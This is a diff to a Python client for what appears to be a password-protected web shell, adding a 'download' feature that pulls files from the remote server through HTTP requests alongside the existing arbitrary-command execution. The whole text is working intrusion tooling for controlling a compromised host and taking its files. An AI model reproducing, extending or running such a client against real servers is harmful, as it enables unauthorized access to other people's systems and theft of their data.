@@ -47,6 +47,18 @@ def fiturcd(cmd, getdir):
             return result
     else:
         return False
+        
+def fiturdownload(cmd, getdir):
+    getfile = re.match(r'download (.*)', cmd, re.M|re.I)
+    
+    if getfile:
+        result = getdir + "/" + getfile.group(1)
+        
+        return result
+        
+        #
+    else:
+        return False
 
     
 def connect():
@@ -89,6 +101,12 @@ def connect():
                     getdir = get(url, params={"password":password,"dir":output,"cmd":"pwd"}).text.replace('\n','')
                     result = get(url, params={"password":password,"dir":getdir,"cmd":cmd}).text
                     command = "Remback@shell:" +getdir + "# "
+                elif(fiturdownload(cmd, getdir) != False):
+                    getname = re.match(r'download (.*)', cmd, re.M|re.I)
+                    output = fiturdownload(cmd, getdir)
+                    savein = raw_input("[?] Save File in: ")      
+                    download = get(url, params={"password":password,"dir":getdir,"cmd":"echo ''","aksi":"download","file":output})       
+                    open(savein + "/" + getname.group(1), 'wb').write(download.content)
                 else:
                     result = get(url, params={"password":password,"dir":getdir,"cmd":cmd}).text
 
@@ -124,3 +142,4 @@ elif action == "2":
     connect()
 else:
     print("[!] Incorrect options")
+
